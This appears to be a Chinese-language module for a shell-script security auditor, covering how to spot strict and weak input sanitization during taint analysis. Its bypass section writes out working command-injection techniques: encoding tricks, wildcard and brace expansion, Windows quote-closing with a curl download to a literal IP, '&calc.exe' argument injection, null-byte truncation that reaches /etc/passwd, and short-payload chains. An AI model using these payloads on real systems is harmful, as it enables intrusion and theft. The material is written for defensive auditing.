# 参数消毒检测

在污点传播追踪过程中，如果脚本对输入参数做了严格的消毒（sanitization），则终止该路径的继续传播分析，并在报告中标注消毒位置和风险评定。

**加载时机：** 每次分析脚本中的污点传播路径时加载此文件。

## 严格消毒模式（终止传播）

以下模式被视为严格消毒，发现后终止该污点路径的继续传播：

### 白名单字符过滤

```bash
# 只允许字母数字
CLEAN=$(echo "$INPUT" | tr -cd 'a-zA-Z0-9')
CLEAN=$(echo "$INPUT" | sed 's/[^a-zA-Z0-9]//g')
CLEAN="${INPUT//[^a-zA-Z0-9]/}"

# 只允许字母数字和下划线
CLEAN=$(echo "$INPUT" | tr -cd 'a-zA-Z0-9_')
CLEAN=$(echo "$INPUT" | sed 's/[^a-zA-Z0-9_]//g')

# 只允许数字
CLEAN=$(echo "$INPUT" | tr -cd '0-9')
CLEAN=$(echo "$INPUT" | sed 's/[^0-9]//g')
CLEAN="${INPUT//[^0-9]/}"

# 只允许 IP 地址格式
if [[ "$INPUT" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then ...

# 只允许特定枚举值
case "$INPUT" in
  start|stop|restart|status) ;;
  *) echo "invalid"; exit 1 ;;
esac
```

### 正则白名单验证

```bash
# bash 正则匹配
if [[ "$INPUT" =~ ^[a-zA-Z0-9._-]+$ ]]; then ...
if [[ ! "$INPUT" =~ ^[0-9]+$ ]]; then exit 1; fi

# grep 白名单验证
echo "$INPUT" | grep -qE '^[a-zA-Z0-9._-]+$' || exit 1

# Python re 白名单
import re
if not re.match(r'^[a-zA-Z0-9._-]+$', user_input):
    raise ValueError("invalid input")

# Perl 白名单
die "invalid" unless $input =~ /^[a-zA-Z0-9._-]+$/;
```

### 专业转义函数

```bash
# Shell 转义
QUOTED=$(printf '%q' "$INPUT")
# printf %q 会对所有特殊字符进行转义

# Python shlex.quote
import shlex
safe_input = shlex.quote(user_input)

# Perl String::ShellQuote
use String::ShellQuote;
my $safe = shell_quote($input);

# PHP escapeshellarg
$safe = escapeshellarg($input);

# PHP escapeshellcmd
$safe = escapeshellcmd($input);
```

### 参数化传递（避免 shell 解释）

```bash
# 使用参数数组而非字符串拼接
subprocess.run(["tar", "czf", "backup.tar.gz", user_input])
# 参数数组不经过 shell 解释，天然安全

exec.Command("tar", "czf", "backup.tar.gz", userInput)
# Go exec.Command 参数数组

# find -print0 + xargs -0
find . -name "*.log" -print0 | xargs -0 rm
# 使用 null 分隔符，防止文件名中的特殊字符被解释
```

### 路径规范化 + 前缀验证

```bash
# realpath + 前缀检查
REAL=$(realpath "$USER_PATH")
case "$REAL" in
  /var/data/*) ;;  # 在允许目录内
  *) echo "path traversal denied"; exit 1 ;;
esac

# readlink -f + 前缀检查
REAL=$(readlink -f "$USER_PATH")
if [[ "$REAL" != /var/data/* ]]; then exit 1; fi

# Python pathlib 路径验证
from pathlib import Path
base = Path("/var/data").resolve()
target = (base / user_input).resolve()
if not str(target).startswith(str(base)):
    raise ValueError("path traversal")
```

### 类型强制转换

```bash
# 强制转为整数
PORT=$((INPUT + 0))
# bash 算术运算会自动转为数字，非数字变为 0

# Python int() 强制转换
port = int(user_input)  # 非数字会抛异常

# Perl 数字上下文
my $port = $input + 0;
```

## 弱消毒模式（不终止传播，但降低风险等级）

以下模式提供一定保护但不充分，标记为弱消毒，继续传播但降低风险等级：

```bash
# 黑名单过滤（总有遗漏）
CLEAN=$(echo "$INPUT" | sed 's/[;&|`]//g')
# 黑名单不完整，攻击者可能找到未过滤的字符

# 仅去除特定字符
CLEAN="${INPUT//;/}"
CLEAN="${INPUT//\`/}"
# 只去除分号或反引号，其他危险字符仍在

# 简单的引号包裹（仍可能被突破）
CMD="echo '$INPUT'"
# 如果 INPUT 包含单引号 ' 则可突破

# 长度限制（不防止注入）
if [ ${#INPUT} -gt 100 ]; then exit 1; fi
# 100 个字符足够注入命令

# HTML 转义（不适用于 shell 上下文）
CLEAN=$(echo "$INPUT" | sed 's/</\&lt;/g')
# HTML 转义对 shell 无效
```

## 消毒绕过技术

审计时如果发现弱消毒，需检查以下绕过方式是否可行：

### 编解码绕过

如果过滤了 `;`、`|`、`&` 等字符但允许编解码命令：

```bash
# base64 编解码
echo "Ow==" | base64 -d    # 解码得到 ;
printf ";" | xxd -p        # 编码得到 3b
echo "3b" | xxd -r -ps     # 解码得到 ;

# 如果黑名单未覆盖 base64/xxd 等命令，可通过编解码获取被过滤的字符
```

### 特殊字符获取（无需直接输入）

```bash
# 通过环境变量截取获取特殊字符
$(expr substr $PWD 1 1)    # 得到 /
$(pwd|cut -c1)             # 得到 /
${PATH:0:1}                # 得到 /

# 通过特定变量获取
$IFS                       # 空格
${PS2}                     # >
~                          # $HOME
~+                         # $PWD
~-                         # $OLDPWD

# 通过 shell 特性获取空格
\t                         # sh/bash 中的制表符（IFS 默认包含制表符作为分隔符，效果类似空格）
# expect 中 \t、\v、\f、\r 都是空格

# 花括号展开（只能执行单条指令）
{ls,-la}                   # 等价于 ls -la
```

### Bash 模式匹配绕过

前提：能在环境上创建带特殊字符的文件名。

```bash
# 创建文件名为 "sleep 999" 的文件
touch "sleep 999"
# 输入 sleep* 利用通配符匹配，绕过空格限制
# sleep* 匹配到 "sleep 999"，命令被执行

# ? 匹配一个任意字符
# !(PATTERN) 匹配除 PATTERN 之外的模式
```

### Windows \" 闭合绕过

Java `Runtime.exec(String[])` 中，如果第一个元素为命令且后续元素为参数：

```java
// 通常只能无参数执行命令
String[] cmd = new String[]{"ipconfig"};

// 通过 \" 闭合并添加参数
String inputStr = "ipconfig\" -all";
// 实际执行: ipconfig -all

String inputStr = "curl\" 10.31.234.176:8088 -o \"D:\\testurl.txt";
// 下载文件

// 限制：参数以 / 开头会被转义为 \，只能注入非 / 开头的参数
```

### Windows .bat/.cmd 参数中的 &| 注入

```java
// Java exec(String[]) 第一个值为 .bat/.cmd 时
String[] cmdArr = new String[]{"D:/test.bat", userInput};
Runtime.getRuntime().exec(cmdArr);

// userInput = "|calc.exe"   → 执行 calc.exe
// userInput = "&calc.exe"   → 执行 calc.exe
// userInput = "&&calc.exe"  → 执行 calc.exe

// 原因：JRE 拼接数组为字符串后调用 CreateProcessW
// .bat 文件由 cmd.exe /c 解析，|、&、&& 被当作命令分隔符
```

### Bash 空字符（\0）绕过

Bash 对 `\0` 有两种处理方式，与常规字符串操作不一致：

```bash
# 截断绕过（ANSI-C Quoting）— 绕过 endsWith/后缀名校验
a="evil.jsp\x00.png"
bash -c "touch \$'$a'"
# 实际创建 evil.jsp，绕过 .png 后缀白名单

# Java 场景：后端用 path.endsWith("/passwd") 过滤
# 攻击者传入 /etc/passwd%5cx00aa.txt（%5c = 反斜杠）
# Shell 中 ANSI-C Quoting 解码后 Bash 截断为 /etc/passwd

# 忽略绕过（命令替换）— 绕过 contains 黑名单
a="/etc/pass\u0000wd"
cat $(echo -e "$a")
# Bash 忽略 \0，实际执行 cat /etc/passwd

# 审计检查：
# 1. 用户输入是否过滤了 \0、\x00、%00、\u0000
# 2. endsWith/contains 校验是否在 Shell 执行前进行
# 3. 如果未过滤空字符且传入 Shell，标记为高风险
```

### 长度限制绕过

```bash
# 分次写入文件后执行
echo 'statement1' > 1.t
echo 'statement2' >> 1.t
sh 1.t

# 5 字节注入：利用 ls、>、\ 组合写入
>ls\\
ls>a
>\ \\
>-t\\
>\>b
ls>>a
# 得到含 "ls -t>b" 的文件 a，执行后按时间排序写入文件名

# 4 字节注入：dir + rev + * 或 ex 命令
# dir 以空格分割输出（无回车），rev 逆序，* 通配符展开为命令

# 多段拼接：bash -c "XXXX 注入点A yyyy 注入点B zzzz"
# 无报错限制: bash -c "a=$PATH;***;echo $a"
# 有报错限制: bash -c "$(a=$PATH;t=***;echo $a)"
```

## 消毒检测流程

在污点传播追踪中，对每个变量赋值和传递点执行以下检查：

1. **检查变量是否经过消毒：**
   - 搜索变量在使用前是否经过上述严格消毒模式处理
   - 检查消毒是否在使用之前（而非之后）

2. **判定消毒强度：**
   - 严格消毒（白名单、专业转义函数、参数化传递、路径前缀验证）→ **终止传播**
   - 弱消毒（黑名单、简单引号、长度限制）→ **继续传播，降低风险等级**
   - 无消毒 → **继续传播，保持原风险等级**

3. **记录消毒信息：**
   在报告中标注：
   ```
   消毒检测：scriptA.sh:15 对 $1 执行了严格白名单过滤 (tr -cd 'a-zA-Z0-9')
   传播状态：终止
   风险评定：低（参数已被严格消毒，后续操作不受污点影响）
   ```
